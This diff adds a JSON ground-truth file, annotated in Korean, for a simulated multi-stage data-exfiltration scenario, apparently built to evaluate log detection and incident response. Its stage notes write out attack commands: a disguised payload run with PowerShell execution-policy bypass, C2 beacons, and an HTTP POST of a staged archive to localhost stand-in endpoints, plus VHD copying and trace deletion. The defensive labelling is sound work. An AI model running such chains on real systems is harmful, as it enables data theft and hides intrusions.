@@ -1,0 +1,610 @@
+﻿{
+    "schema_version":  "2.0",
+    "scenario_name":  "multi_stage_exfiltration_with_vhd_simulated_usb",
+    "records":  [
+                    {
+                        "stage_id":  1,
+                        "stage_name":  "authorized_logon",
+                        "action_type":  "user_logon",
+                        "description":  "내부 사용자가 정상 계정으로 로그인하여 작업 세션을 시작한다",
+                        "attack":  false,
+                        "stage_start_time":  "2026-05-21T22:51:42.6475905+09:00",
+                        "stage_end_time":  "2026-05-21T22:51:47.6640778+09:00",
+                        "artifact_paths":  [
+
+                                           ],
+                        "user":  "jso45",
+                        "host":  "DESKTOP-BAK6QER",
+                        "execution_status":  "success",
+                        "observed_event_ids":  {
+                                                   "sysmon":  [
+
+                                                              ],
+                                                   "security":  [
+
+                                                                ]
+                                               },
+                        "expected_event_ids":  {
+                                                   "security":  [
+                                                                    4624
+                                                                ],
+                                                   "sysmon":  [
+
+                                                              ]
+                                               },
+                        "primary_log_signal":  "Logon Event",
+                        "notes":  "정상 로그인 이벤트. ground truth 매칭 시 공격 행위에서 제외"
+                    },
+                    {
+                        "stage_id":  2,
+                        "stage_name":  "suspicious_url_access",
+                        "action_type":  "browser_url_access",
+                        "description":  "사용자가 피싱 메일의 의심 URL(ioc_suspicious_url)을 클릭하여 악성 서버에 접속한다. 실제 실행 시 sim_payload_url(localhost)로 대체한다",
+                        "attack":  true,
+                        "stage_start_time":  "2026-05-21T22:51:58.3511533+09:00",
+                        "stage_end_time":  "2026-05-21T22:52:00.6403822+09:00",
+                        "artifact_paths":  [
+
+                                           ],
+                        "user":  "jso45",
+                        "host":  "DESKTOP-BAK6QER",
+                        "execution_status":  "success",
+                        "observed_event_ids":  {
+                                                   "sysmon":  [
+                                                                  1,
+                                                                  3
+                                                              ],
+                                                   "security":  [
+                                                                    4688
+                                                                ]
+                                               },
+                        "expected_event_ids":  {
+                                                   "security":  [
+                                                                    4688
+                                                                ],
+                                                   "sysmon":  [
+                                                                  1,
+                                                                  3
+                                                              ]
+                                               },
+                        "primary_log_signal":  "Network Connection from Browser",
+                        "notes":  "sim_payload_url = http://127.0.0.1:8080/payload. 실행 전 로컬 HTTP 리스너 필요 (python3 -m http.server 8080)"
+                    },
+                    {
+                        "stage_id":  3,
+                        "stage_name":  "script_download",
+                        "action_type":  "file_download",
+                        "description":  "악성 서버(sim_payload_url)로부터 payload_download_path(KB5019274.log)를 Downloads 폴더로 다운로드한다",
+                        "attack":  true,
+                        "stage_start_time":  "2026-05-21T22:52:05.8516546+09:00",
+                        "stage_end_time":  "2026-05-21T22:52:09.8824312+09:00",
+                        "artifact_paths":  [
+                                               "C:\\Users\\jso45\\Downloads\\KB5019274.log"
+                                           ],
+                        "user":  "jso45",
+                        "host":  "DESKTOP-BAK6QER",
+                        "execution_status":  "success",
+                        "observed_event_ids":  {
+                                                   "sysmon":  [
+                                                                  11
+                                                              ],
+                                                   "security":  [
+                                                                    4663
+                                                                ]
+                                               },
+                        "expected_event_ids":  {
+                                                   "security":  [
+                                                                    4663
+                                                                ],
+                                                   "sysmon":  [
+                                                                  11
+                                                              ]
+                                               },
+                        "primary_log_signal":  "File Create in Downloads",
+                        "notes":  "Invoke-WebRequest -Uri sim_payload_url -OutFile payload_download_path 사용"
+                    },
+                    {
+                        "stage_id":  4,
+                        "stage_name":  "powershell_execution",
+                        "action_type":  "script_execution",
+                        "description":  "다운로드된 payload_download_path(KB5019274.log)를 -ExecutionPolicy Bypass 플래그와 함께 PowerShell로 실행한다",
+                        "attack":  true,
+                        "stage_start_time":  "2026-05-21T22:52:13.9918017+09:00",
+                        "stage_end_time":  "2026-05-21T22:52:15.0540235+09:00",
+                        "artifact_paths":  [
+                                               "C:\\Users\\jso45\\Downloads\\KB5019274.log"
+                                           ],
+                        "user":  "jso45",
+                        "host":  "DESKTOP-BAK6QER",
+                        "execution_status":  "success",
+                        "observed_event_ids":  {
+                                                   "sysmon":  [
+                                                                  1
+                                                              ],
+                                                   "security":  [
+                                                                    4688
+                                                                ]
+                                               },
+                        "expected_event_ids":  {
+                                                   "security":  [
+                                                                    4688
+                                                                ],
+                                                   "sysmon":  [
+                                                                  1
+                                                              ]
+                                               },
+                        "primary_log_signal":  "Process Create: powershell.exe",
+                        "notes":  "powershell.exe -ExecutionPolicy Bypass -File payload_download_path 실행"
+                    },
+                    {
+                        "stage_id":  5,
+                        "stage_name":  "network_discovery_ipconfig",
+                        "action_type":  "system_reconnaissance",
+                        "description":  "ipconfig /all 및 systeminfo 실행 결과를 recon_output_file(C:\\PerfLogs\\PerfData_1024.bin)에 저장하여 네트워크 및 호스트 정보를 수집한다",
+                        "attack":  true,
+                        "stage_start_time":  "2026-05-21T22:52:18.4134076+09:00",
+                        "stage_end_time":  "2026-05-21T22:52:25.9917553+09:00",
+                        "artifact_paths":  [
+                                               "C:\\PerfLogs\\PerfData_1024.bin"
+                                           ],
+                        "user":  "jso45",
+                        "host":  "DESKTOP-BAK6QER",
+                        "execution_status":  "success",
+                        "observed_event_ids":  {
+                                                   "sysmon":  [
+                                                                  1,
+                                                                  11
+                                                              ],
+                                                   "security":  [
+                                                                    4688
+                                                                ]
+                                               },
+                        "expected_event_ids":  {
+                                                   "security":  [
+                                                                    4688
+                                                                ],
+                                                   "sysmon":  [
+                                                                  1,
+                                                                  11
+                                                              ]
+                                               },
+                        "primary_log_signal":  "Process Create: ipconfig",
+                        "notes":  "실행 명령: ipconfig /all | Out-File recon_output_file; systeminfo | Out-File recon_output_file -Append. recon_output_file은 cleanup_survivors에 포함되어 stage 17에서 삭제되지 않음"
+                    },
+                    {
+                        "stage_id":  6,
+                        "stage_name":  "documents_enumeration",
+                        "action_type":  "file_and_directory_discovery",
+                        "description":  "target_collection_dir(Documents) 하위에서 collection_extensions에 해당하는 파일을 재귀 탐색하여 수집 대상 목록을 추출한다",
+                        "attack":  true,
+                        "stage_start_time":  "2026-05-21T22:52:30.5392875+09:00",
+                        "stage_end_time":  "2026-05-21T22:52:34.5542446+09:00",
+                        "artifact_paths":  [
+
+                                           ],
+                        "user":  "jso45",
+                        "host":  "DESKTOP-BAK6QER",
+                        "execution_status":  "success",
+                        "observed_event_ids":  {
+                                                   "sysmon":  [
+
+                                                              ],
+                                                   "security":  [
+                                                                    4656,
+                                                                    4663
+                                                                ]
+                                               },
+                        "expected_event_ids":  {
+                                                   "security":  [
+                                                                    4663,
+                                                                    4656
+                                                                ],
+                                                   "sysmon":  [
+
+                                                              ]
+                                               },
+                        "primary_log_signal":  "Object Access: Documents",
+                        "notes":  "탐색 대상: C:\\Users\\jso45\\Documents, 확장자 필터: .docx .xlsx .pdf .txt .csv .pptx, 최대 수집 수: 20개(collection_max_files)"
+                    },
+                    {
+                        "stage_id":  7,
+                        "stage_name":  "initial_file_staging",
+                        "action_type":  "file_staging",
+                        "description":  "탐색된 파일 중 collection_max_files개를 staging_directory(C:\\ProgramData\\WinSvc\\{93AD7F})로 복사하여 외부 전송 준비를 위한 로컬 스테이징을 수행한다",
+                        "attack":  true,
+                        "stage_start_time":  "2026-05-21T22:52:37.9293049+09:00",
+                        "stage_end_time":  "2026-05-21T22:52:41.9759414+09:00",
+                        "artifact_paths":  [
+                                               "C:\\ProgramData\\WinSvc\\{93AD7F}"
+                                           ],
+                        "user":  "jso45",
+                        "host":  "DESKTOP-BAK6QER",
+                        "execution_status":  "success",
+                        "observed_event_ids":  {
+                                                   "sysmon":  [
+                                                                  11
+                                                              ],
+                                                   "security":  [
+                                                                    4656,
+                                                                    4663
+                                                                ]
+                                               },
+                        "expected_event_ids":  {
+                                                   "security":  [
+                                                                    4663,
+                                                                    4656
+                                                                ],
+                                                   "sysmon":  [
+                                                                  11
+                                                              ]
+                                               },
+                        "primary_log_signal":  "File Create in Staging Dir",
+                        "notes":  "실행 명령: New-Item -ItemType Directory -Path staging_directory; Copy-Item -Path $file -Destination staging_directory. staging_directory는 cleanup_targets에 포함되어 stage 17에서 삭제됨"
+                    },
+                    {
+                        "stage_id":  8,
+                        "stage_name":  "c2_attempt_primary",
+                        "action_type":  "c2_beacon_attempt",
+                        "description":  "Invoke-WebRequest로 sim_c2_primary(127.0.0.1:8888/check-in)에 체크인 시도하며 연결 실패를 유도한다",
+                        "attack":  true,
+                        "stage_start_time":  "2026-05-21T22:52:45.2729732+09:00",
+                        "stage_end_time":  "2026-05-21T22:52:51.3355543+09:00",
+                        "artifact_paths":  [
+
+                                           ],
+                        "user":  "jso45",
+                        "host":  "DESKTOP-BAK6QER",
+                        "execution_status":  "success",
+                        "observed_event_ids":  {
+                                                   "sysmon":  [
+                                                                  3
+                                                              ],
+                                                   "security":  [
+
+                                                                ]
+                                               },
+                        "expected_event_ids":  {
+                                                   "security":  [
+
+                                                                ],
+                                                   "sysmon":  [
+                                                                  3
+                                                              ]
+                                               },
+                        "primary_log_signal":  "Network Connection: C2 Primary",
+                        "notes":  "실행 명령: Invoke-WebRequest -Uri sim_c2_primary -UseBasicParsing -TimeoutSec 5. 리스너 응답 없이 연결 시도 로그만 생성되도록 설계"
+                    },
+                    {
+                        "stage_id":  9,
+                        "stage_name":  "c2_attempt_retry",
+                        "action_type":  "c2_fallback_beacon",
+                        "description":  "Primary C2 실패 후 sim_c2_secondary(127.0.0.1:4444/beacon)로 Fallback 재시도한다",
+                        "attack":  true,
+                        "stage_start_time":  "2026-05-21T22:52:54.9133945+09:00",
+                        "stage_end_time":  "2026-05-21T22:53:00.9454870+09:00",
+                        "artifact_paths":  [
+
+                                           ],
+                        "user":  "jso45",
+                        "host":  "DESKTOP-BAK6QER",
+                        "execution_status":  "success",
+                        "observed_event_ids":  {
+                                                   "sysmon":  [
+                                                                  3
+                                                              ],
+                                                   "security":  [
+
+                                                                ]
+                                               },
+                        "expected_event_ids":  {
+                                                   "security":  [
+
+                                                                ],
+                                                   "sysmon":  [
+                                                                  3
+                                                              ]
+                                               },
+                        "primary_log_signal":  "Network Connection: C2 Secondary",
+                        "notes":  "실행 명령: Invoke-WebRequest -Uri sim_c2_secondary -UseBasicParsing -TimeoutSec 10. Primary(8888)와 Secondary(4444) 포트를 다르게 설정하여 Fallback 패턴 구분"
+                    },
+                    {
+                        "stage_id":  10,
+                        "stage_name":  "archive_attempt_failure",
+                        "action_type":  "archive_creation_fail",
+                        "description":  "staging_directory를 archive_temp_file(C:\\ProgramData\\WinSvc\\{93AD7F}\\data001.tmp)로 압축 시도하나 실패한다",
+                        "attack":  true,
+                        "stage_start_time":  "2026-05-21T22:53:04.4292302+09:00",
+                        "stage_end_time":  "2026-05-21T22:53:09.4915857+09:00",
+                        "artifact_paths":  [
+
+                                           ],
+                        "user":  "jso45",
+                        "host":  "DESKTOP-BAK6QER",
+                        "execution_status":  "success",
+                        "observed_event_ids":  {
+                                                   "sysmon":  [
+                                                                  1
+                                                              ],
+                                                   "security":  [
+                                                                    4688
+                                                                ]
+                                               },
+                        "expected_event_ids":  {
+                                                   "security":  [
+                                                                    4688
+                                                                ],
+                                                   "sysmon":  [
+                                                                  1
+                                                              ]
+                                               },
+                        "primary_log_signal":  "Compress Attempt",
+                        "notes":  "Compress-Archive -Path staging_directory\\* -DestinationPath archive_temp_file -ErrorAction Stop"
+                    },
+                    {
+                        "stage_id":  11,
+                        "stage_name":  "archive_retry_success",
+                        "action_type":  "archive_creation_success",
+                        "description":  "대기 후 Compress-Archive를 재실행하여 staging_directory를 archive_temp_file(C:\\ProgramData\\WinSvc\\{93AD7F}\\data001.tmp)를 생성한다",
+                        "attack":  true,
+                        "stage_start_time":  "2026-05-21T22:53:13.1321368+09:00",
+                        "stage_end_time":  "2026-05-21T22:53:20.1794234+09:00",
+                        "artifact_paths":  [
+                                               "C:\\ProgramData\\WinSvc\\{93AD7F}\\data001.tmp"
+                                           ],
+                        "user":  "jso45",
+                        "host":  "DESKTOP-BAK6QER",
+                        "execution_status":  "success",
+                        "observed_event_ids":  {
+                                                   "sysmon":  [
+                                                                  11
+                                                              ],
+                                                   "security":  [
+                                                                    4688
+                                                                ]
+                                               },
+                        "expected_event_ids":  {
+                                                   "security":  [
+                                                                    4688
+                                                                ],
+                                                   "sysmon":  [
+                                                                  11
+                                                              ]
+                                               },
+                        "primary_log_signal":  "Archive Creation",
+                        "notes":  "실행 명령: Compress-Archive -Path staging_directory\\* -DestinationPath archive_temp_file -Force. stage 10 → 11 반복 압축 패턴으로 상관 분석 가능"
+                    },
+                    {
+                        "stage_id":  12,
+                        "stage_name":  "archive_rename",
+                        "action_type":  "file_masquerading",
+                        "description":  "archive_temp_file을 archive_final_file(C:\\ProgramData\\WinSvc\\TaskCache.dat)로 이름을 변경한다",
+                        "attack":  true,
+                        "stage_start_time":  "2026-05-21T22:53:23.8044100+09:00",
+                        "stage_end_time":  "2026-05-21T22:53:27.8511765+09:00",
+                        "artifact_paths":  [
+                                               "C:\\ProgramData\\WinSvc\\TaskCache.dat"
+                                           ],
+                        "user":  "jso45",
+                        "host":  "DESKTOP-BAK6QER",
+                        "execution_status":  "success",
+                        "observed_event_ids":  {
+                                                   "sysmon":  [
+                                                                  11
+                                                              ],
+                                                   "security":  [
+
+                                                                ]
+                                               },
+                        "expected_event_ids":  {
+                                                   "security":  [
+
+                                                                ],
+                                                   "sysmon":  [
+                                                                  11
+                                                              ]
+                                               },
+                        "primary_log_signal":  "File Rename: .zip to .dat",
+                        "notes":  "실행 명령: Rename-Item -Path archive_temp_file -NewName archive_final_file. 콘텐츠 변경 없이 확장자만 변경. archive_final_file은 cleanup_targets에 포함되어 stage 17에서 삭제됨"
+                    },
+                    {
+                        "stage_id":  13,
+                        "stage_name":  "email_artifact_creation",
+                        "action_type":  "email_draft_preparation",
+                        "description":  "email_draft_file(C:\\Users\\Public\\Libraries\\desktop.ini)를 생성하여 archive_final_file을 참조하는 이메일 초안 형태의 파일을 준비한다",
+                        "attack":  true,
+                        "stage_start_time":  "2026-05-21T22:53:31.0542062+09:00",
+                        "stage_end_time":  "2026-05-21T22:53:35.0858444+09:00",
+                        "artifact_paths":  [
+                                               "C:\\Users\\Public\\Libraries\\desktop.ini"
+                                           ],
+                        "user":  "jso45",
+                        "host":  "DESKTOP-BAK6QER",
+                        "execution_status":  "success",
+                        "observed_event_ids":  {
+                                                   "sysmon":  [
+                                                                  11
+                                                              ],
+                                                   "security":  [
+                                                                    4663
+                                                                ]
+                                               },
+                        "expected_event_ids":  {
+                                                   "security":  [
+                                                                    4663
+                                                                ],
+                                                   "sysmon":  [
+                                                                  11
+                                                              ]
+                                               },
+                        "primary_log_signal":  "File Create: .eml",
+                        "notes":  "Out-File로 .eml 구조 직접 작성. 수신자 도메인은 defang 처리된 더미값 사용. email_draft_file은 cleanup_survivors에 포함되어 stage 17에서 삭제되지 않음"
+                    },
+                    {
+                        "stage_id":  14,
+                        "stage_name":  "external_upload_attempt",
+                        "action_type":  "data_exfiltration",
+                        "description":  "archive_final_file(C:\\ProgramData\\WinSvc\\TaskCache.dat)을 바이너리로 읽어 sim_exfil_endpoint(127.0.0.1:8080/upload)에 HTTP POST로 업로드한다",
+                        "attack":  true,
+                        "stage_start_time":  "2026-05-21T22:53:38.6789832+09:00",
+                        "stage_end_time":  "2026-05-21T22:53:47.7417512+09:00",
+                        "artifact_paths":  [
+
+                                           ],
+                        "user":  "jso45",
+                        "host":  "DESKTOP-BAK6QER",
+                        "execution_status":  "success",
+                        "observed_event_ids":  {
+                                                   "sysmon":  [
+                                                                  3
+                                                              ],
+                                                   "security":  [
+
+                                                                ]
+                                               },
+                        "expected_event_ids":  {
+                                                   "security":  [
+
+                                                                ],
+                                                   "sysmon":  [
+                                                                  3
+                                                              ]
+                                               },
+                        "primary_log_signal":  "Network Activity",
+                        "notes":  "실행 명령: $bytes = [System.IO.File]::ReadAllBytes(archive_final_file); Invoke-WebRequest -Uri sim_exfil_endpoint -Method POST -Body $bytes -ContentType \u0027application/octet-stream\u0027. sim_exfil_endpoint = http://127.0.0.1:8080/upload"
+                    },
+                    {
+                        "stage_id":  15,
+                        "stage_name":  "vhd_mount_simulated_usb",
+                        "action_type":  "removable_media_simulation",
+                        "description":  "vhd_image_path(C:\\ProgramData\\SysCache\\volume_image.vhd)를 생성하고 E: 드라이브에 마운트한다",
+                        "attack":  true,
+                        "stage_start_time":  "2026-05-21T22:53:51.2258490+09:00",
+                        "stage_end_time":  "2026-05-21T22:54:06.2574004+09:00",
+                        "artifact_paths":  [
+                                               "C:\\ProgramData\\SysCache\\volume_image.vhd"
+                                           ],
+                        "user":  "jso45",
+                        "host":  "DESKTOP-BAK6QER",
+                        "execution_status":  "success",
+                        "observed_event_ids":  {
+                                                   "sysmon":  [
+                                                                  1
+                                                              ],
+                                                   "security":  [
+                                                                    4688
+                                                                ]
+                                               },
+                        "expected_event_ids":  {
+                                                   "security":  [
+                                                                    4688
+                                                                ],
+                                                   "sysmon":  [
+                                                                  1
+                                                              ]
+                                               },
+                        "primary_log_signal":  "VHD Mount",
+                        "notes":  "실행 명령: New-VHD -Path vhd_image_path -SizeBytes 500MB -Fixed; Mount-DiskImage -ImagePath vhd_image_path; Initialize-Disk; New-Partition -DriveLetter E -UseMaximumSize; Format-Volume -DriveLetter E -FileSystem NTFS -Confirm:$false. 이후 New-Item -Path vhd_target_directory -ItemType Directory 로 LeakStage 폴더 생성"
+                    },
+                    {
+                        "stage_id":  16,
+                        "stage_name":  "bulk_copy_to_vhd",
+                        "action_type":  "copy_bulk_data_to_removable_media",
+                        "description":  "staging_directory의 파일을 vhd_target_directory(E:\\LeakStage)로 복사한다",
+                        "attack":  true,
+                        "stage_start_time":  "2026-05-21T22:54:09.8350983+09:00",
+                        "stage_end_time":  "2026-05-21T22:54:14.8665239+09:00",
+                        "artifact_paths":  [
+                                               "E:\\LeakStage"
+                                           ],
+                        "user":  "jso45",
+                        "host":  "DESKTOP-BAK6QER",
+                        "execution_status":  "success",
+                        "observed_event_ids":  {
+                                                   "sysmon":  [
+                                                                  11
+                                                              ],
+                                                   "security":  [
+                                                                    4656,
+                                                                    4663
+                                                                ]
+                                               },
+                        "expected_event_ids":  {
+                                                   "security":  [
+                                                                    4663,
+                                                                    4656
+                                                                ],
+                                                   "sysmon":  [
+                                                                  11
+                                                              ]
+                                               },
+                        "primary_log_signal":  "File Create in VHD",
+                        "notes":  "실행 명령: Copy-Item -Path staging_directory\\* -Destination vhd_target_directory -Recurse. staging_directory가 이미 cleanup_targets에 포함되므로 복사 완료 후 stage 17에서 원본 삭제됨"
+                    },
+                    {
+                        "stage_id":  17,
+                        "stage_name":  "partial_cleanup",
+                        "action_type":  "partial_artifact_deletion",
+                        "description":  "cleanup_targets에서 3개를 삭제하여 흔적을 줄인다. cleanup_survivors는 삭제하지 않아 IR 수집 대상으로 잔존한다",
+                        "attack":  true,
+                        "stage_start_time":  "2026-05-21T22:54:26.4914276+09:00",
+                        "stage_end_time":  "2026-05-21T22:54:31.4919695+09:00",
+                        "artifact_paths":  [
+
+                                           ],
+                        "user":  "jso45",
+                        "host":  "DESKTOP-BAK6QER",
+                        "execution_status":  "success",
+                        "observed_event_ids":  {
+                                                   "sysmon":  [
+                                                                  26
+                                                              ],
+                                                   "security":  [
+                                                                    4663
+                                                                ]
+                                               },
+                        "expected_event_ids":  {
+                                                   "security":  [
+                                                                    4663
+                                                                ],
+                                                   "sysmon":  [
+                                                                  26
+                                                              ]
+                                               },
+                        "primary_log_signal":  "File Delete",
+                        "notes":  "실행 명령: cleanup_targets의 각 항목에 대해 Remove-Item -Path $target -Recurse -Force -ErrorAction SilentlyContinue 실행. Windows EventLog, Sysmon, PowerShell ScriptBlock Log는 삭제 불가 — IR팀 수집 대상"
+                    },
+                    {
+                        "stage_id":  18,
+                        "stage_name":  "session_termination",
+                        "action_type":  "process_exit",
+                        "description":  "공격 PowerShell 세션을 정상 종료한다",
+                        "attack":  false,
+                        "stage_start_time":  "2026-05-21T22:54:35.6171860+09:00",
+                        "stage_end_time":  "2026-05-21T22:54:41.6795726+09:00",
+                        "artifact_paths":  [
+
+                                           ],
+                        "user":  "jso45",
+                        "host":  "DESKTOP-BAK6QER",
+                        "execution_status":  "success",
+                        "observed_event_ids":  {
+                                                   "sysmon":  [
+                                                                  1
+                                                              ],
+                                                   "security":  [
+                                                                    4688
+                                                                ]
+                                               },
+                        "expected_event_ids":  {
+                                                   "security":  [
+                                                                    4688
+                                                                ],
+                                                   "sysmon":  [
+                                                                  1
+                                                              ]
+                                               },
+                        "primary_log_signal":  "Process Exit",
+                        "notes":  "종료 후 cleanup_survivors 및 VHD 이미지(vhd_image_path), 모든 이벤트 로그가 IR팀 수집 대상으로 잔존"
+                    }
+                ]
+}
